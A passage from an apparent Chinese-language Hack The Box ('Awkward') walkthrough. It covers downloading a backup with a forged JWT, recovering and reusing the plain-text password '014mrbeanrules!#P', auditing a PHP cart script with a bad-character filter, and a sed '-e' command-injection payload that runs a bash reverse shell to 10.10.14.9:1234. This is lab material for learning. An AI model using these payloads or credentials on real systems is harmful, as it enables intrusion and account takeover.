/home/bean/Documents/backup_tmp/bean_backup.tar.gz .</span><br><span class="line">date &gt; /home/bean/Documents/backup_tmp/time.txt</span><br><span class="line">cd /home/bean/Documents/backup_tmp</span><br><span class="line">tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .</span><br><span class="line">rm -r /home/bean/Documents/backup_tmp</span><br></pre></td></tr></table></figure><p>可以看到这里将&#x2F;home&#x2F;bean目录进行了压缩，且就在<code>/home/bean/Documents/backup/bean_backup_final.tar.gz</code>中，我们下载下来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/rainb0w/Desktop]</span><br><span class="line">└──╼ #curl http://hat-valley.htb/api/all-leave -b &quot;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii4vJyAvaG9tZS9iZWFuL0RvY3VtZW50cy9iYWNrdXAvYmVhbl9iYWNrdXBfZmluYWwudGFyLmd6ICciLCJpYXQiOjE2NzQ5MjIzNTl9.PLcLBxoaAfCESZJkq9za0h0okRXIm6twDMaS-4Z4GHE&quot; --output bean_backup_final.zip</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100 31714  100 31714    0     0  39153      0 --:--:-- --:--:-- --:--:-- 39104</span><br></pre></td></tr></table></figure><p>解压后，在<code>.config/xpad/content-DS1ZS1</code>中得到bean的ssh密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/rainb0w/Desktop/1]</span><br><span class="line">└──╼ #cat .config/xpad/content-DS1ZS1 </span><br><span class="line">TO DO:</span><br><span class="line">- Get real hat prices / stock from Christine</span><br><span class="line">- Implement more secure hashing mechanism for HR system</span><br><span class="line">- Setup better confirmation message when adding item to cart</span><br><span class="line">- Add support for item quantity &gt; 1</span><br><span class="line">- Implement checkout system</span><br><span class="line"></span><br><span class="line">boldHR SYSTEM/bold</span><br><span class="line">bean.hill</span><br><span class="line">014mrbeanrules!#P</span><br><span class="line"></span><br><span class="line">https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html</span><br><span class="line"></span><br><span class="line">boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold</span><br></pre></td></tr></table></figure><p>登陆后，即可看到user.txt。</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>上传linpeas.sh文件并运行：</p><p><a href="https://pic.imgdb.cn/item/63d5ee3bface21e9efea608d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee3bface21e9efea608d.jpg"></a></p><p>可以看到这个配置文件正是刚刚爆破的子域名的配置文件。进入<code>http://store.hat-valley.htb/</code>如下所示：</p><p><a href="https://pic.imgdb.cn/item/63d5ee48face21e9efea81d4.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee48face21e9efea81d4.jpg"></a></p><p>可以在<code>/etc/nginx/sites-available/store.conf</code>中看到<code>auth_basic_user_file</code>的值为<code>/etc/nginx/conf.d/.htpasswd</code>，<code>auth_basic_user_file</code>配置指定保存用户名密码的文件。</p><p>查看<code>/etc/nginx/conf.d/.htpasswd</code>文件，内容如下：</p><p><a href="https://pic.imgdb.cn/item/63d5ee60face21e9efeab145.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee60face21e9efeab145.jpg"></a></p><p>其中username为admin，密码无法爆破。我们将刚才登陆bean的ssh密码作为登陆<a href="http://store.hat-valley.htb/%E7%9A%84%E5%AF%86%E7%A0%81%E8%AF%95%E8%AF%95%EF%BC%8C%E5%8D%B3%EF%BC%9A">http://store.hat-valley.htb/的密码试试，即：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=014mrbeanrules!#P</span><br></pre></td></tr></table></figure><p>成功登陆。界面如下：</p><p><a href="https://pic.imgdb.cn/item/63d5ee93face21e9efeb0f4e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5ee93face21e9efeb0f4e.jpg"></a></p><p>在刚刚的配置文件中，还可以看到网站源代码的位置为&#x2F;var&#x2F;www&#x2F;store。审计网站源代码，发现<code>cart_actions.php</code>存在命令注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$STORE_HOME</span> = <span class="string">&quot;/var/www/store/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//check for valid hat valley store item</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkValidItem</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="variable">$first_line</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$first_line</span>, <span class="string">&quot;***Hat Valley&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//add to cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;add_item&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$item_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="variable">$bad_chars</span> = <span class="keyword">array</span>(<span class="string">&quot;;&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;!&quot;</span>,<span class="string">&quot;#&quot;</span>); <span class="comment">//no hacking allowed!!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$item_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">checkValidItem</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>product-details/<span class="subst">&#123;$item_id&#125;</span>.txt&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;***Hat Valley Cart***&#x27; &gt; <span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;head -2 <span class="subst">&#123;$STORE_HOME&#125;</span>product-details/<span class="subst">&#123;$item_id&#125;</span>.txt | tail -1 &gt;&gt; <span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Item added successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid item&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//delete from cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;delete_item&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$item_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="variable">$bad_chars</span> = <span class="keyword">array</span>(<span class="string">&quot;;&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;!&quot;</span>,<span class="string">&quot;#&quot;</span>); <span class="comment">//no hacking allowed!!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$item_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">checkValidItem</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;sed -i &#x27;/item_id=<span class="subst">&#123;$item_id&#125;</span>/d&#x27; <span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Item removed from cart&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid item&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fetch from cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;GET&#x27;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;fetch_items&#x27;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart&quot;</span>);</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">array_slice</span>(<span class="variable">$dir</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$user_id</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, -<span class="number">18</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user_id</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">checkValidItem</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$product_file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$file&#125;</span>&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="variable">$details</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$product_file</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$line</span>) !== <span class="string">&quot;***Hat Valley Cart***&quot;</span>) &#123; <span class="comment">//don&#x27;t include first line</span></span><br><span class="line">                    <span class="title function_ invoke__">array_push</span>(<span class="variable">$details</span>, <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$line</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$details</span> <span class="keyword">as</span> <span class="variable">$cart_item</span>) &#123;</span><br><span class="line">                 <span class="variable">$cart_items</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>, <span class="variable">$cart_item</span>);</span><br><span class="line">                 <span class="keyword">for</span>(<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$cart_items</span>); <span class="variable">$x</span>++) &#123;</span><br><span class="line">                      <span class="variable">$cart_items</span>[<span class="variable">$x</span>] = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;=&quot;</span>, <span class="variable">$cart_items</span>[<span class="variable">$x</span>]); <span class="comment">//key and value as separate values in subarray</span></span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="variable">$html</span> .= <span class="string">&quot;&lt;tr&gt;&lt;td&gt;<span class="subst">&#123;$cart_items[1][1]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$cart_items[2][1]&#125;</span>&lt;/td&gt;&lt;td&gt;<span class="subst">&#123;$cart_items[3][1]&#125;</span>&lt;/td&gt;&lt;td&gt;&lt;button data-id=<span class="subst">&#123;$cart_items[0][1]&#125;</span> onclick=\&quot;removeFromCart(this, localStorage.getItem(&#x27;user&#x27;))\&quot; class=&#x27;remove-item&#x27;&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>重点是这部分代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//delete from cart</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;delete_item&#x27;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$item_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;item&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="variable">$bad_chars</span> = <span class="keyword">array</span>(<span class="string">&quot;;&quot;</span>,<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;|&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;!&quot;</span>,<span class="string">&quot;#&quot;</span>); <span class="comment">//no hacking allowed!!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$item_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$bad_chars</span> <span class="keyword">as</span> <span class="variable">$bad</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user_id</span>, <span class="variable">$bad</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Bad character detected!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">checkValidItem</span>(<span class="string">&quot;<span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;sed -i &#x27;/item_id=<span class="subst">&#123;$item_id&#125;</span>/d&#x27; <span class="subst">&#123;$STORE_HOME&#125;</span>cart/<span class="subst">&#123;$user_id&#125;</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Item removed from cart&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid item&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先会过滤掉我们POST传入的<code>item</code>参数和<code>user</code>参数，这使得我们无法利用特殊字符来进行命令注入。接着利用<code>checkValidItem</code>函数来判断&#x2F;var&#x2F;www&#x2F;store&#x2F;cart&#x2F;{$user_id}文件是否存在且该文件的开头是否有***Hat Valley字样。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//check for valid hat valley store item</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkValidItem</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="variable">$first_line</span> = <span class="title function_ invoke__">file</span>(<span class="variable">$filename</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$first_line</span>, <span class="string">&quot;***Hat Valley&quot;</span>) !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过是验证成功，就会利用system执行一串命令，在这里我们可以滥用sed命令。sed命令的-e参数允许我们传递脚本。假设我们编写的shell文件如下：</p><p><a href="https://pic.imgdb.cn/item/63d5eea4face21e9efeb346d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eea4face21e9efeb346d.jpg"></a></p><p>首先nc监听1235，接着执行如下命令：</p><p><a href="https://pic.imgdb.cn/item/63d5eeb2face21e9efeb4d8f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eeb2face21e9efeb4d8f.jpg"></a></p><p>结果如下：</p><p><a href="https://pic.imgdb.cn/item/63d5eebfface21e9efeb663e.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eebfface21e9efeb663e.jpg"></a></p><p>可以看到我们编写的shell确实被执行了。那么我们就可以写入一个shell文件，并构造item使得该shell文件被执行。首先编写&#x2F;tmp&#x2F;1.sh，内容为反弹shell的bash命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bean@awkward:/tmp$ echo &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.9/1234 0&gt;&amp;1&quot;&#x27; &gt; 1.sh</span><br><span class="line">bean@awkward:/tmp$ chmod +x 1.sh</span><br></pre></td></tr></table></figure><p>接着我们添加一个合法的hat valley store item：</p><p><a href="https://pic.imgdb.cn/item/63d5eed1face21e9efeb87a0.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eed1face21e9efeb87a0.jpg"></a></p><p>接着传入POST如下payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=delete_item&amp;item=&#x27; -e &#x27;1e /tmp/1.sh&#x27; /tmp/1.sh &#x27;&amp;user=1</span><br></pre></td></tr></table></figure><p>成功执行&#x2F;tmp&#x2F;1.sh：</p><p><a href="https://pic.imgdb.cn/item/63d5eedfface21e9efeba526.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eedfface21e9efeba526.jpg"></a></p><p>接着我们上传pspy监控一下进程，发现系统在利用<code>inotifywait</code>监控&#x2F;var&#x2F;www&#x2F;private&#x2F;leave_requests.csv文件：</p><p><a href="https://pic.imgdb.cn/item/63d5eeedface21e9efebc0b9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d5eeedface21e9efebc0b9.jpg"></a></p><p>这里介绍一下inotifywait的常用参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 